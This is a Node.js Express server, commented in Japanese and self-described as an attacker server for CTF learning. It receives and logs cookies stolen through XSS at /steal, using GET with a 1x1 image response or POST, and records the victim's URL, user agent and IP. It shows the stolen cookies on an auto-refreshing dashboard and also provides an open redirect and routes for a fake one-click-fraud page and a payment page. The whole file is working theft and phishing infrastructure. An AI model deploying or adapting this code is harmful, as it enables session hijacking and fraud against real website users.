const express = require('express');
const path = require('path');
const os = require('os');
const fs = require('fs');

const app = express();
const PORT = 3001;

// ログファイルのパス
const logDir = path.join(__dirname, 'logs');
const logFile = path.join(logDir, 'stolen_cookies.log');

// ログディレクトリが存在しない場合は作成
if (!fs.existsSync(logDir)) {
  fs.mkdirSync(logDir, { recursive: true });
}

// CORS設定（XSS攻撃のテスト用）
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// JSONパーサー
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 静的ファイルの配信
app.use(express.static(path.join(__dirname)));

// ログをファイルに書き込む関数
function writeLog(data) {
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] ${JSON.stringify(data)}\n`;
  fs.appendFileSync(logFile, logEntry, 'utf8');
}

// Cookieを受け取るエンドポイント（GET/POST両方に対応）
app.get('/steal', (req, res) => {
  const cookies = req.query.cookies || req.query.cookie || '';
  const url = req.query.url || req.headers.referer || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  
  const stolenData = {
    method: 'GET',
    cookies: cookies,
    url: url,
    userAgent: userAgent,
    ip: ip,
    timestamp: new Date().toISOString()
  };
  
  console.log('\n🍪 ===== Cookie盗取成功 =====');
  console.log('📋 クッキー:', cookies);
  console.log('🌐 元のURL:', url);
  console.log('👤 User-Agent:', userAgent);
  console.log('📍 IPアドレス:', ip);
  console.log('⏰ 時刻:', stolenData.timestamp);
  console.log('===========================\n');
  
  // ログファイルに記録
  writeLog(stolenData);
  
  // レスポンス（画像として返すことで、imgタグのsrc属性からも利用可能）
  res.setHeader('Content-Type', 'image/png');
  res.setHeader('Cache-Control', 'no-cache');
  // 1x1透明なPNG画像を返す（実際の画像データは省略、ブラウザがエラーを出さないように）
  res.send(Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64'));
});

app.post('/steal', (req, res) => {
  const cookies = req.body.cookies || req.body.cookie || '';
  const url = req.body.url || req.headers.referer || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  
  const stolenData = {
    method: 'POST',
    cookies: cookies,
    url: url,
    userAgent: userAgent,
    ip: ip,
    timestamp: new Date().toISOString()
  };
  
  console.log('\n🍪 ===== Cookie盗取成功 =====');
  console.log('📋 クッキー:', cookies);
  console.log('🌐 元のURL:', url);
  console.log('👤 User-Agent:', userAgent);
  console.log('📍 IPアドレス:', ip);
  console.log('⏰ 時刻:', stolenData.timestamp);
  console.log('===========================\n');
  
  // ログファイルに記録
  writeLog(stolenData);
  
  res.json({ success: true, message: 'Cookie received' });
});

// ログを表示するエンドポイント
app.get('/logs', (req, res) => {
  if (fs.existsSync(logFile)) {
    const logs = fs.readFileSync(logFile, 'utf8');
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.send(logs);
  } else {
    res.json({ message: 'ログファイルが存在しません' });
  }
});

// ログをクリアするエンドポイント
app.post('/logs/clear', (req, res) => {
  if (fs.existsSync(logFile)) {
    fs.writeFileSync(logFile, '', 'utf8');
    res.json({ success: true, message: 'ログをクリアしました' });
  } else {
    res.json({ success: false, message: 'ログファイルが存在しません' });
  }
});

// 偽ページ（ワンクリック詐欺）のエンドポイント
app.get('/fake', (req, res) => {
  const fakePagePath = path.join(__dirname, 'fake_page.html');
  if (fs.existsSync(fakePagePath)) {
    res.sendFile(fakePagePath);
  } else {
    res.status(404).send('偽ページが見つかりません');
  }
});

// 決済ページのエンドポイント
app.get('/payment', (req, res) => {
  const paymentPagePath = path.join(__dirname, 'payment_page.html');
  if (fs.existsSync(paymentPagePath)) {
    res.sendFile(paymentPagePath);
  } else {
    res.status(404).send('決済ページが見つかりません');
  }
});

// リダイレクト用エンドポイント（XSS攻撃などで使用）
app.get('/redirect', (req, res) => {
  // クエリパラメータでリダイレクト先を指定可能
  const target = req.query.to || '/fake';
  res.redirect(target);
});

// ダッシュボード（盗取されたCookieを表示）
app.get('/', (req, res) => {
  let logs = [];
  if (fs.existsSync(logFile)) {
    const logContent = fs.readFileSync(logFile, 'utf8');
    logs = logContent
      .split('\n')
      .filter(line => line.trim())
      .map(line => {
        try {
          return JSON.parse(line.replace(/^\[.*?\] /, ''));
        } catch (e) {
          return null;
        }
      })
      .filter(log => log !== null)
      .reverse(); // 新しいものから表示
  }
  
  res.send(`
    <!DOCTYPE html>
    <html lang="ja">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>攻撃者サーバー - Cookie盗取ダッシュボード</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container {
          max-width: 1200px;
          margin: 0 auto;
          background: white;
          border-radius: 10px;
          padding: 30px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        h1 {
          color: #333;
          margin-bottom: 20px;
          border-bottom: 3px solid #667eea;
          padding-bottom: 10px;
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 20px;
          margin-bottom: 30px;
        }
        .stat-card {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          padding: 20px;
          border-radius: 8px;
          text-align: center;
        }
        .stat-card h3 {
          font-size: 2em;
          margin-bottom: 10px;
        }
        .log-entry {
          background: #f5f5f5;
          border-left: 4px solid #667eea;
          padding: 15px;
          margin-bottom: 15px;
          border-radius: 4px;
        }
        .log-entry h3 {
          color: #667eea;
          margin-bottom: 10px;
        }
        .log-entry p {
          margin: 5px 0;
          word-break: break-all;
        }
        .cookie {
          background: #fff3cd;
          padding: 10px;
          border-radius: 4px;
          font-family: monospace;
          margin-top: 10px;
          word-break: break-all;
        }
        .btn {
          background: #dc3545;
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 5px;
          cursor: pointer;
          margin-top: 20px;
        }
        .btn:hover {
          background: #c82333;
        }
        .empty {
          text-align: center;
          color: #999;
          padding: 40px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🍪 Cookie盗取ダッシュボード</h1>
        
        <div class="stats">
          <div class="stat-card">
            <h3>${logs.length}</h3>
            <p>盗取されたCookie数</p>
          </div>
        </div>
        
        <h2>盗取されたCookie一覧</h2>
        
        ${logs.length === 0 ? 
          '<div class="empty"><p>まだCookieが盗取されていません</p></div>' :
          logs.map(log => `
            <div class="log-entry">
              <h3>📋 ${log.timestamp}</h3>
              <p><strong>方法:</strong> ${log.method}</p>
              <p><strong>URL:</strong> ${log.url}</p>
              <p><strong>IP:</strong> ${log.ip}</p>
              <p><strong>User-Agent:</strong> ${log.userAgent}</p>
              <div class="cookie">
                <strong>🍪 Cookie:</strong><br>
                ${log.cookies || '(空)'}
              </div>
            </div>
          `).join('')
        }
        
        <button class="btn" onclick="clearLogs()">ログをクリア</button>
      </div>
      
      <script>
        function clearLogs() {
          if (confirm('本当にログをクリアしますか？')) {
            fetch('/logs/clear', { method: 'POST' })
              .then(() => location.reload());
          }
        }
        
        // 5秒ごとに自動リロード
        setInterval(() => {
          location.reload();
        }, 5000);
      </script>
    </body>
    </html>
  `);
});

// ネットワークインターフェースのIPアドレスを取得
function getLocalIPAddresses() {
  const interfaces = os.networkInterfaces();
  const addresses = [];
  const preferredAddresses = []; // 192.168.x.xを優先
  
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      // IPv4で、内部（非ループバック）アドレスのみ
      if (iface.family === 'IPv4' && !iface.internal) {
        const ip = iface.address;
        // 192.168.x.xを優先リストに追加
        if (ip.startsWith('192.168.')) {
          preferredAddresses.push(ip);
        } else {
          addresses.push(ip);
        }
      }
    }
  }
  
  // 優先アドレスがあればそれを返す、なければ通常のアドレスを返す
  return preferredAddresses.length > 0 ? preferredAddresses : addresses;
}

// サーバー起動
app.listen(PORT, '0.0.0.0', () => {
  const localIPs = getLocalIPAddresses();
  console.log(`\n🎯 ===== 攻撃者サーバー起動 =====`);
  
  if (localIPs.length > 0) {
    const mainIP = localIPs[0];
    console.log(`📍 ダッシュボード: http://${mainIP}:${PORT}`);
    console.log(`   http://localhost:${PORT}`);
    console.log(`\n📡 Cookie盗取エンドポイント:`);
    console.log(`   GET/POST: http://${mainIP}:${PORT}/steal?cookies=COOKIE_VALUE`);
    console.log(`\n🎭 偽ページ（ワンクリック詐欺）:`);
    console.log(`   http://${mainIP}:${PORT}/fake`);
    console.log(`   http://localhost:${PORT}/fake`);
    console.log(`\n💳 決済ページ:`);
    console.log(`   http://${mainIP}:${PORT}/payment`);
    console.log(`   http://localhost:${PORT}/payment`);
    console.log(`\n🔄 リダイレクトエンドポイント:`);
    console.log(`   http://${mainIP}:${PORT}/redirect?to=/fake`);
    
    if (localIPs.length > 1) {
      console.log(`   （その他のIPアドレス: ${localIPs.slice(1).map(ip => `http://${ip}:${PORT}`).join(', ')}）`);
    }
  } else {
    console.log(`📍 ダッシュボード: http://localhost:${PORT}`);
    console.log(`📡 Cookie盗取エンドポイント: http://localhost:${PORT}/steal?cookies=COOKIE_VALUE`);
    console.log(`🎭 偽ページ: http://localhost:${PORT}/fake`);
    console.log(`💳 決済ページ: http://localhost:${PORT}/payment`);
    console.log(`🔄 リダイレクト: http://localhost:${PORT}/redirect?to=/fake`);
  }
  
  console.log(`\n⚠️  このサーバーはCTF学習目的のみで使用してください。`);
  console.log(`📝 ログファイル: ${logFile}`);
  console.log(`================================\n`);
});
